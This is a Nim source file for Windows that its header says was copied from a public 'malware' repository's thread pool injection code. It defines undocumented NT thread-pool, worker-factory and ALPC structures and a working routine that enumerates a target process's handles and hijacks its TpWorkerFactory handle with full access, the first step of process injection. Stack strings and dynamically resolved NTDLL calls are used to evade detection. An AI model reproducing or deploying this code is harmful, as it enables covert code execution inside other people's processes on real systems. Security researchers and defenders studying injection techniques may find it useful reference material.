#[
    Copy pasta from: https://github.com/m4ul3r/malware/blob/main/nim/thread_pool_injection/nimpool.nim
]#
import winim/lean

import ../instance
import ../utils/[stackstr]
import ../utils/stdlib/[stringh]

#[ Helper Templates ]#
template label*(name, body) =
  {.emit: astToStr(name) & ":".}
  body

template goto*(name) =
  {.emit: "goto " & astToStr(name) & ";".}

#[ 
  Process Handle Objects
]#
type
  PROCESS_HANDLE_TABLE_ENTRY_INFO* {.pure.} = object
    HandleValue*: HANDLE
    HandleCount*: ULONG_PTR
    PointerCount*: ULONG_PTR
    GrantedAccess*: ACCESS_MASK
    ObjectTypeIndex*: ULONG
    HandleAttributes*: ULONG
    Reserved*: ULONG
  PPROCESS_HANDLE_TABLE_ENTRY_INFO* = ptr PROCESS_HANDLE_TABLE_ENTRY_INFO

  PROCESS_HANDLE_SNAPSHOT_INFORMATION* {.pure.} = object
    NumberOfHandles*: ULONG_PTR
    Reserved*: ULONG_PTR
    Handles*: array[ANYSIZE_ARRAY, PROCESS_HANDLE_TABLE_ENTRY_INFO] 
  PPROCESS_HANDLE_SNAPSHOT_INFORMATION* = ptr PROCESS_HANDLE_SNAPSHOT_INFORMATION

#[
  Worker Factory Constants
]#
const WORKER_FACTORY_RELEASE_WORKER* = 0x1
const WORKER_FACTORY_WAIT* = 0x2
const WORKER_FACTORY_SET_INFORMATION* = 0x4
const WORKER_FACTORY_QUERY_INFORMATION* = 0x8
const WORKER_FACTORY_READY_WORKER* = 0x10
const WORKER_FACTORY_SHUTDOWN* = 0x20
const WORKER_FACTORY_ALL_ACCESS* = STANDARD_RIGHTS_REQUIRED or WORKER_FACTORY_RELEASE_WORKER or WORKER_FACTORY_WAIT or WORKER_FACTORY_SET_INFORMATION or WORKER_FACTORY_QUERY_INFORMATION or WORKER_FACTORY_READY_WORKER or WORKER_FACTORY_SHUTDOWN

#[ 
  Worker Factory Objects 
]#
type
  WORKER_FACTORY_BASIC_INFORMATION* {.pure.} = object
    Timeout*: LARGE_INTEGER
    RetryTimeout*: LARGE_INTEGER
    IdleTimeout*: LARGE_INTEGER
    Paused*: BOOLEAN
    TimerSet*: BOOLEAN
    QueuedToExWorker*: BOOLEAN
    MayCreate*: BOOLEAN
    CreateInProgress*: BOOLEAN
    InsertedIntoQueue*: BOOLEAN
    Shutdown*: BOOLEAN
    BindingCount*: ULONG
    ThreadMinimum*: ULONG
    ThreadMaximum*: ULONG
    PendingWorkerCount*: ULONG
    WaitingWorkerCount*: ULONG
    TotalWorkerCount*: ULONG
    ReleaseCount*: ULONG
    InfiniteWaitGoal*: LONGLONG
    StartRoutine*: PVOID
    StartParameter*: PVOID
    ProccessId*: HANDLE
    StackReserve*: SIZE_T
    StackCommit*: SIZE_T
    LastThreadCreationStatus*: NTSTATUS
  PWORKER_FACTORY_BASIC_INFORMATION* {.pure.} = ptr WORKER_FACTORY_BASIC_INFORMATION

  SET_WORKERFACTORYINFOCLASS* = enum
    workerFactoryTimeout = 0, 
    workerFactoryRetryTimeout = 1, 
    workerFactoryIdleTimeout = 2, 
    workerFactoryBindingCount = 3,
    workerFactoryThreadMinimum = 4, 
    workerFactoryThreadMaximum = 5, 
    workerFactoryPaused = 6, 
    workerFactoryAdjustThreadGoal = 8,
    workerFactoryCallbackType = 9, 
    workerFactoryStackInformation = 10, 
    workerFactoryThreadBasePriority = 11,
    workerFactoryTimeoutWaiters = 12, 
    workerFactoryFlags = 13, 
    workerFactoryThreadSoftMaximum = 14, 
    workerFactoryMaxInfoClass = 15
  PSET_WORKERFACTORYINFORCLASS* = ptr SET_WORKERFACTORYINFOCLASS

  QUERY_WORKERFACTORYINFOCLASS* = enum
    workerFactoryBasicInformation  = 7
  PQUERY_WORKERFACTORYINFOCLASS* = ptr QUERY_WORKERFACTORYINFOCLASS

  TP_TASK_CALLBACKS* {.pure.} = object
    ExecuteCallback*: PVOID
    Unposted*: PVOID
  PTP_TASK_CALLBACKS* = ptr TP_TASK_CALLBACKS

  TP_TASK* {.pure.} = object
    Callbacks*: PTP_TASK_CALLBACKS 
    NumaNode*: UINT32
    IdealProcessor*: UINT8
    Padding_242*: array[3, CHAR]
    ListEntry*: LIST_ENTRY
  PTP_TASK* = ptr TP_TASK

  TPP_REFCOUNT* {.pure.} = object
    Refcount*: INT32
  PTPP_REFCOUNT* = ptr TPP_REFCOUNT

  TPP_CALLER* {.pure.} = object
    ReturnAddress*: PVOID
  PTPP_CALLER* = ptr TPP_CALLER

  TP_DIRECT* {.pure.} = object
    Task*: TP_TASK
    Lock: UINT64
    IoCompletionInformationList*: LIST_ENTRY
    Callback*: PVOID
    NumNode*: UINT32
    IdealProcessor*: UINT8
    Padding*: array[3, CHAR]
  PTP_DIRECT* = ptr TP_DIRECT

  TPP_TIMER_SUBQUEUE* {.pure.} = object
    Expiration*: INT64
    WindowStart*: TPP_PH
    WindowEnd*: TPP_PH
    Timer*: PVOID
    TimerPkt*: PVOID
    Direct*: TP_DIRECT
    ExpirationWindow*: UINT32
    Padding: array[1, INT32]
  PTPP_TIMER_SUBQUEUE* = ptr TPP_TIMER_SUBQUEUE

  TPP_TIMER_QUEUE* {.pure.} = object
    Lock*: RTL_SRWLOCK
    AbsoluteQueue*: TPP_TIMER_SUBQUEUE
    RelativeQueue*: TPP_TIMER_SUBQUEUE
    AllocatedTimerCount*: INT32
    Padding: array[1, INT32]
  PTPP_TIMER_QUEUE* = ptr TPP_TIMER_QUEUE

  TPP_NUMA_NODE* {.pure.} = object
    WorkerCount*: INT32
  PTPP_NUMA_NODE* = ptr TPP_NUMA_NODE

  TPP_POOL_QUEUE_STATE_UNION1* {.pure.} = object  
    RunningThreadGoal* {.bitsize:16.}: int32
    PendingReleaseCount* {.bitsize:16.}: uint32
    QueueLength*: uint32

  TPP_POOL_QUEUE_STATE* {.pure, union.} = object
    Exchange*: int
    Union_1*: TPP_POOL_QUEUE_STATE_UNION1
  PTPP_POOL_QUEUE_STATE* = ptr TPP_POOL_QUEUE_STATE

  TPP_QUEUE* {.pure.} = object
    Queue*: LIST_ENTRY
    Lock*: RTL_SRWLOCK
  PTPP_QUEUE* = ptr TPP_QUEUE

  FULL_TP_POOL_UNION_1* {.pure, union.} = object
    Union_1*: TPP_POOL_QUEUE_STATE

  FULL_TP_POOL* {.pure.} = object
    Refcount*: TPP_REFCOUNT
    Padding_239*: LONG
    QueueState*: FULL_TP_POOL_UNION_1
    TaskQueue*: array[3, PTPP_QUEUE]
    NumaNode*: PTPP_NUMA_NODE
    ProximityInfo*: PGROUP_AFFINITY
    WorkerFactory*: PVOID
    CompletionPort*: PVOID
    Lock*: RTL_SRWLOCK
    PoolObjectList*: LIST_ENTRY
    WorkerList*: LIST_ENTRY
    TimerQueue*: TPP_TIMER_QUEUE
    ShutdownLock*: RTL_SRWLOCK
    ShutdownInitiated*: UINT8
    Release*: UINT8
    PoolFlags*: UINT16
    Padding_240*: LONG
    PoolLinks*: LIST_ENTRY
    AllocCaller*: TPP_CALLER
    ReleaseCaller*: TPP_CALLER
    AvailableWorkerCount*: INT32
    LongRunningWorkerCount*: INT32
    LastProcCount*: UINT32
    NodeStatus*: INT32
    BindingCount*: INT32
    CallbackChecksDisabled* {.bitsize:1.}: UINT32
    TrimTarget* {.bitsize:11.}: UINT32
    TrimmedThrdCount* {.bitsize:11.}: UINT32
    SelectedCpuSetCount*: UINT32
    Padding_241*: LONG
    TrimComplete*: RTL_CONDITION_VARIABLE
    TrimmedWorkerList*: LIST_ENTRY
  PFULL_TP_POOL* = ptr FULL_TP_POOL

  ALPC_WORK_ON_BEHALF_TICKET* {.pure.} = object
    ThreadId*: UINT32
    ThreadCreationTimeLow*: UINT32
  PALPC_WORK_ON_BEHALF_TICKET* = ptr ALPC_WORK_ON_BEHALF_TICKET

  TPP_WORK_STATE_UNION1* {.pure, union.} = object
    Exchange*: INT32
    Insertable* {.bitsize:1.}: UINT32
    PendingCallbackCount* {.bitsize:31.}: UINT32

  TPP_WORK_STATE* {.pure.} = object
    Union_1*: TPP_WORK_STATE_UNION1
  PTPP_WORK_STATE* = ptr TPP_WORK_STATE

  TPP_ITE_WAITER* {.pure.} = object
    Next*: ptr TPP_ITE_WAITER
    ThreadId*: PVOID
  PTPP_ITE_WAITER* = ptr TPP_ITE_WAITER
  
  TPP_PH_LINKS* {.pure.} = object
    Siblings*: LIST_ENTRY
    Children*: LIST_ENTRY
    Key*: INT64
  PTPP_PH_LINKS* = ptr TPP_PH_LINKS

  TPP_ITE* {.pure.} = object
    First*: PTPP_ITE_WAITER
  PTPP_ITE* = ptr TPP_ITE

  TPP_PH* {.pure.} = object
    Root*: PTPP_PH_LINKS
  PTPP_PH* = ptr TPP_PH

  TPP_FLAGS_COUNT_UNION1* {.pure, union.} = object
    Count* {.bitsize:60.}: UINT64
    Flags* {.bitsize:4.}: UINT64
    Data*: INT64

  TPP_FLAGS_COUNT* {.pure.} = object
    Union_1*: TPP_FLAGS_COUNT_UNION1
  PTPP_FLAGS_COUNT* = ptr TPP_FLAGS_COUNT


  TPP_BARRIER* {.pure.} = object
    Ptr*: TPP_FLAGS_COUNT
    WaitLock*: RTL_SRWLOCK
    WaitList*: TPP_ITE
  PTPP_BARRIER* = ptr TPP_BARRIER
  
  TPP_CLEANUP_GROUP_MEMBER_UNION1* {.pure, union.} = object
    Callback*: PVOID
    WorkCallback*: PVOID
    SimpleCallback*: PVOID
    WaitCallback*: PVOID
    IoCallback*: PVOID
    AlpcCallback*: PVOID
    AlpcCallbackEx*: PVOID
    JobCallback*: PVOID

  TPP_CLEANUP_GROUP_MEMBER_UNION2* {.pure, union.} = object
    Flags*: INT32
    LongFunction* {.bitsize:1.}: INT32
    Persistent* {.bitsize:1.}: INT32
    UnusedPublic* {.bitsize:14.}: INT32
    Release* {.bitsize:1.}: INT32
    CleanupGroupReleased* {.bitsize:1.}: INT32
    InCleanupGroupCleanupList* {.bitsize:1.}: INT32
    UnusedPrivate* {.bitsize:13.}: INT32
  
  TP_CLEANUP_GROUP* {.pure.} = object
    Refcount*: TPP_REFCOUNT
    Released*: INT32
    MemberLock*: RTL_SRWLOCK
    MemberList*: LIST_ENTRY
    Barrier*: TPP_BARRIER
    CleanupLock*: RTL_SRWLOCK
    CleanupList*: LIST_ENTRY
  PTP_CLEANUP_GROUP* = ptr TP_CLEANUP_GROUP

  TPP_CLEANUP_GROUP_MEMBER* {.pure.} = object
    Refcount*: TPP_REFCOUNT
    Padding_233*: LONG
    VFuncs*: PVOID #TPP_CLEANUP_GROUP_MEMBER_VFUNCS
    CleanupGroup*: PTP_CLEANUP_GROUP
    CleanupGroupCancelCallback*: PVOID
    FinalizationCallback*: PVOID
    CleanupGroupMemberLinks*: LIST_ENTRY
    CallbackBarrier*: TPP_BARRIER
    Union_1*: TPP_CLEANUP_GROUP_MEMBER_UNION1
    Context*: PVOID
    ActivationContext*: PVOID #PACTIVATION_CONTEXT
    SubProcessTag*: PVOID
    ActivityId*: GUID
    WorkOnBehalfTicket*: ALPC_WORK_ON_BEHALF_TICKET
    RaceDll*: PVOID
    Pool*: PFULL_TP_POOL
    PoolObjectLinks*: LIST_ENTRY
    Union_2*: TPP_CLEANUP_GROUP_MEMBER_UNION2
    Padding_234*: LONG
    AllocCaller*: TPP_CALLER
    ReleaseCaller*: TPP_CALLER
    CallbackPriority*: TP_CALLBACK_PRIORITY
    Padding*: array[1, INT32]
  PTPP_CLEANUP_GROUP_MEMBER* = ptr TPP_CLEANUP_GROUP_MEMBER

  FULL_TP_WORK* {.pure.} = object
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    Task*: TP_TASK
    WorkState*: TPP_WORK_STATE
    Padding*: array[1, INT32]
  PFULL_TP_WORK* = ptr FULL_TP_WORK

  FULL_TP_TIMER_UNION_1* {.pure, union.} = object
    WindowEndLinks*: TPP_PH_LINKS
    ExpirationLinks*: LIST_ENTRY

  FULL_TP_TIMER_UNION_2* {.pure, union.} = object
    TimerStatus*: UINT8
    InQueue* {.bitsize:1.}: UINT8
    Absolute* {.bitsize:1.}: UINT8
    Cancelled* {.bitsize:1.}: UINT8

  FULL_TP_TIMER* {.pure.} = object
    Work*: FULL_TP_WORK
    Lock*: RTL_SRWLOCK
    Union_1*: FULL_TP_TIMER_UNION_1
    WindowStartLinks*: TPP_PH_LINKS
    DueTime*: INT64
    Ite*: TPP_ITE
    Window*: UINT32
    Period*: UINT32
    Inserted*: UINT8
    WaitTimer*: UINT8
    Union_2*: FULL_TP_TIMER_UNION_2
    BlockInsert*: UINT8
    Padding*: array[1, INT32]
  PFULL_TP_TIMER* = ptr FULL_TP_TIMER

  T2_SET_PARAMETERS* {.pure.} = object
    Version*: ULONG
    Reserved*: ULONG
    NoWakeTolerance*: LONGLONG
  PT2_SET_PARAMETERS* = ptr T2_SET_PARAMETERS

  FULL_TP_WAIT_UNION_1_UNION_1* {.pure, union.} = object
    AllFlags*: UINT8
    NextWaitActive* {.bitsize:1.}: UINT8
    NextTimeoutActive* {.bitsize:1.}: UINT8
    CallbackCounter* {.bitsize:1.}: UINT8
    Spare* {.bitsize:5.}: UINT8

  FULL_TP_WAIT_UNION_1* {.pure, union.} = object
    Union_1*: FULL_TP_WAIT_UNION_1_UNION_1

  FULL_TP_WAIT* {.pure.} = object
    Timer*: FULL_TP_TIMER
    Handle*: PVOID
    WaitPkt*: PVOID
    NextWaitHandle*: PVOID
    NextWaitTimeout*: LARGE_INTEGER
    Direct*: TP_DIRECT
    WaitFlags*: FULL_TP_WAIT_UNION_1
    Padding*: array[7, CHAR]
  PFULL_TP_WAIT* = ptr FULL_TP_WAIT

  FULL_TP_IO* {.pure.} = object
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    Direct*: TP_DIRECT
    File*: PVOID
    PendingIrpCount*: INT32
    Padding*: INT32
  PFULL_TP_IO* = ptr FULL_TP_IO

  FULL_TP_ALPC_UNION_1* {.pure, union.} = object
    Flags*: UINT32
    ExTypeCallback* {.bitsize:1.}: UINT32
    CompletionListRegistered* {.bitsize:1.}: UINT32
    Reserved* {.bitsize:32.}: UINT32

  FULL_TP_ALPC* {.pure.} = object
    Direct*: TP_DIRECT
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    AlpcPort*: PVOID
    DeferredSendCount*: INT32
    LastConcurrencyCount*: INT32
    Union_1*: FULL_TP_ALPC_UNION_1
    Padding*: array[1, INT32]
  PFULL_TP_ALPC* = ptr FULL_TP_ALPC
  
  FULL_TP_JOB_UNION_1* {.pure, union.} = object
    CompletionState*: INT64
    Rundown* {.bitsize:1.}: INT64
    CompletionCount* {.bitsize:63.}: INT64

  FULL_TP_JOB* {.pure.} = object
    Direct*: TP_DIRECT
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    JobHandle*: PVOID
    Union_1*: FULL_TP_JOB_UNION_1
    RundownLock*: RTL_SRWLOCK
  PFULL_TP_JOB* = ptr FULL_TP_JOB

  FILE_COMPLETION_INFO* {.pure.} = object
    Port*: HANDLE
    Key*: PVOID
  PFILE_COMPLETION_INFO* = ptr FILE_COMPLETION_INFO

  ALPC_PORT_ATTRIBUTES* {.pure.} = object
    Flags*: ULONG
    SecurityQos*: SECURITY_QUALITY_OF_SERVICE
    MaxMessageLength*: UINT64
    MemoryBandwidth*: UINT64
    MaxPoolUsage*: UINT64
    MaxSectionSize*: UINT64
    MaxViewSize*: UINT64
    MaxTotalSectionSize*: UINT64
    DupObjectTypes*: ULONG
    when defined(amd64):
      Reserved*: ULONG
  PALPC_PORT_ATTRIBUTES* = ptr ALPC_PORT_ATTRIBUTES

  ALPC_PORT_ASSOCIATE_COMPLETION_PORT* {.pure.} = object
    CompletionKey*: PVOID
    CompletionPort*: HANDLE
  PALPC_PORT_ASSOCIATE_COMPLETION_PORT* = ptr ALPC_PORT_ASSOCIATE_COMPLETION_PORT

  PORT_MESSAGE_UNION_1_S1* {.pure.} = object 
    DataLength*: USHORT
    TotalLength*: USHORT
  
  PORT_MESSAGE_UNION_1* {.pure, union.} = object
    S1*: PORT_MESSAGE_UNION_1_S1
    Length*: ULONG

  PORT_MESSAGE_UNION_2_S2* {.pure.} = object 
    Type*: USHORT
    DataInfoOffset*: USHORT

  PORT_MESSAGE_UNION_2* {.pure, union.} = object
    S2*: PORT_MESSAGE_UNION_2_S2
    ZeroInit*: ULONG

  PORT_MESSAGE_UNION_3* {.pure, union.} = object
    ClientId*: CLIENT_ID
    DoNotUseThisField*: DOUBLE

  PORT_MESSAGE_UNION_4* {.pure, union.} = object
    ClientViewSize*: SIZE_T
    CallbackId*: ULONG

  PORT_MESSAGE* {.pure} = object 
    Union_1*: PORT_MESSAGE_UNION_1
    Union_2*: PORT_MESSAGE_UNION_2
    Union_3*: PORT_MESSAGE_UNION_3
    MessageId*: ULONG
    Union_4*: PORT_MESSAGE_UNION_4
  PPORT_MESSAGE* = ptr PORT_MESSAGE

  ALPC_MESSAGE* {.pure.} = object
    PortHeader*: PORT_MESSAGE
    PortMessage*: array[1000, byte]
  PALPC_MESSAGE* = ptr ALPC_MESSAGE

  ALPC_MESSAGE_ATTRIBUTES* {.pure.} = object
    AllocatedAttributes*: ULONG
    ValidAttributes*: ULONG
  PALPC_MESSAGE_ATTRIBUTES* = ptr ALPC_MESSAGE_ATTRIBUTES

#[
  Generic Objects
]#
type 
  PUBLIC_OBJECT_TYPE_INFORMATION* {.pure.} = object
    TypeName*: UNICODE_STRING
    Reserved*: array[22, ULONG]
  PPUBLIC_OBJECT_TYPE_INFORMATION* = ptr PUBLIC_OBJECT_TYPE_INFORMATION

#[ 
  Function Declarations 
]#
type
  NtAlpcConnectPort* = proc(PortHandle: PHANDLE, PortName: PUNICODE_STRING, ObjectAttributes: POBJECT_ATTRIBUTES, PortAttributes: PALPC_PORT_ATTRIBUTES, ConnectionFlags: DWORD, RequiredServerSid: PSID, ConnectionMessage: PPORT_MESSAGE, ConnectionMessageSize: PSIZE_T, OutMessageAttributes: PALPC_MESSAGE_ATTRIBUTES, InMessageAttributes: PALPC_MESSAGE_ATTRIBUTES, Timeout: PLARGE_INTEGER): NTSTATUS {.stdcall.}
  NtAlpcCreatePort* = proc(PortHandle: PHANDLE, ObjectAttributes: POBJECT_ATTRIBUTES, PortAttributes: PALPC_PORT_ATTRIBUTES): NTSTATUS {.stdcall.}
  NtAlpcSetInformation* = proc(PortHandle: HANDLE, PortInformationClass: ULONG, PortInformation: PVOID, Length: ULONG): NTSTATUS {.stdcall.}
  NtAssociateWaitCompletionPacket* = proc(WaitCompletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.stdcall.}
  NtQueryInformationProcess* = proc(ProcessHandle: HANDLE, ProcessInformationClass: PROCESSINFOCLASS, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
  NtQueryInformationWorkerFactory* = proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: QUERY_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
  NtQueryObject* = proc(Handle: HANDLE, ObjectInformationClass: OBJECT_INFORMATION_CLASS, ObjectInformation: PVOID, ObjectInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
  NtSetInformationFile* = proc(FileHandle: HANDLE, IoStatusBlock: PIO_STATUS_BLOCK, FileInformation: PVOID, Length: ULONG, FileInformationClass: FILE_INFORMATION_CLASS): NTSTATUS {.stdcall.}
  NtSetInformationWorkerFactory* = proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.stdcall.}
  NtSetIoCompletion* = proc(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.stdcall.}
  NtSetTimer2* = proc(TimerHandle: HANDLE, DueTime: PLARGE_INTEGER, Period: PLARGE_INTEGER, Parameters: PT2_SET_PARAMETERS): NTSTATUS {.stdcall.}
  TpAllocAlpcCompletion* = proc(AlpcReturn: ptr PFULL_TP_ALPC, AlpcPort: HANDLE, Callback: PVOID, Context: PVOID, CallbackEnviron: PTP_CALLBACK_ENVIRON): NTSTATUS {.stdcall.}
  TpAllocJobNotification* = proc(JobReturn: ptr PFULL_TP_JOB, HJob: HANDLE, Callback: PVOID, Context: PVOID, CallbackEnviron: PTP_CALLBACK_ENVIRON): NTSTATUS {.stdcall.}

#[
    Public Functions
]#
proc hijackProcessHandle(tProcess: HANDLE, typeName: LPWSTR, desiredAccess: uint): HANDLE =
  var
    pProcessSnapshotInfo: PPROCESS_HANDLE_SNAPSHOT_INFORMATION
    objectInfo: PPUBLIC_OBJECT_TYPE_INFORMATION 
    objectTypeReturnLen: uint
    totalHandles, handleInfoSize: int
    status: NTSTATUS
    duplicatedHandle: HANDLE

  let 
    pNtQueryInformationProcess = cast[NtQueryInformationProcess](
        ninst.Win32.GetProcAddress(
            ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationProcess")
    )
    pNtQueryObject = cast[NtQueryObject](
        ninst.Win32.GetProcAddress(
            ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtQueryObject")
    )
  
  if pNtQueryInformationProcess == nil or pNtQueryObject == nil:
    duplicatedHandle = -1
    goto endOfHijackProcessHandle

  if ninst.Win32.GetProcessHandleCount(tProcess, cast[PDWORD](totalHandles.addr)) == 0: # Total number of handles to account for
    duplicatedHandle = -1 
    goto endOfHijackProcessHandle

  handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((totalHandles + 15) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO))

  pProcessSnapshotInfo = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](
    ninst.Win32.HeapAlloc(ninst.Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize)
    )
  if pProcessSnapshotInfo == nil:
    duplicatedHandle = -1 
    goto endOfHijackProcessHandle

  status = pNtQueryInformationProcess(tProcess, cast[PROCESSINFOCLASS](51), cast[PVOID](pProcessSnapshotInfo), handleInfoSize.ULONG, NULL)
  if not NT_SUCCESS(status):
    # We ignore the error
    # NTAPI_ERR("NtQueryInformationProcess", status)
    discard
  
  var pProcSnapHandles = cast[ptr UncheckedArray[PROCESS_HANDLE_TABLE_ENTRY_INFO]](pProcessSnapshotInfo.Handles.addr) # Cast to an iterable
  for i in 0 ..< pProcessSnapshotInfo.NumberOfHandles:
    # Assume that DuplicateHandle will always work...
    if ninst.Win32.DuplicateHandle(
        tProcess, pProcSnapHandles[i].HandleValue, ninst.Win32.GetCurrentProcess(), duplicatedHandle.addr, desiredAccess.DWORD, FALSE, 0
    ) != 0:

      status = pNtQueryObject(duplicatedHandle, objectTypeInformation, cast[PVOID](0), 0.ULONG, cast[PULONG](objectTypeReturnLen.addr))
      if status != STATUS_INFO_LENGTH_MISMATCH:
        discard

      objectInfo = cast[PPUBLIC_OBJECT_TYPE_INFORMATION](
        ninst.Win32.HeapAlloc(ninst.Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen.SIZE_T))
      if objectInfo == nil:
        break

      status = pNtQueryObject(duplicatedHandle, objectTypeInformation, cast[PVOID](objectInfo), objectTypeReturnLen.ULONG, cast[PULONG](0))
      if not NT_SUCCESS(status):
        # NTAPI_ERR("NtQueryObject", status)
        discard
      else:
        # need to custom define these
        if wcsncmp(typeName, objectInfo.TypeName.Buffer) != 0:
          continue
        else:
          break

      discard ninst.Win32.HeapFree(ninst.Win32.GetProcessHeap(), 0, objectInfo)

  label endOfHijackProcessHandle:
    if pProcessSnapshotInfo != nil:
      discard ninst.Win32.HeapFree(ninst.Win32.GetProcessHeap(), 0, pProcessSnapshotInfo)
    if objectInfo != nil:
      discard ninst.Win32.HeapFree(ninst.Win32.GetProcessHeap(), 0, objectInfo)
    return duplicatedHandle

# Helpers
proc hijackProcessWorkerFactory*(processHandle: HANDLE): HANDLE =
  let target {.stackStringW.} = "TpWorkerFactory"
  return hijackProcessHandle(processHandle, cast[LPWSTR](target[0].addr), WORKER_FACTORY_ALL_ACCESS)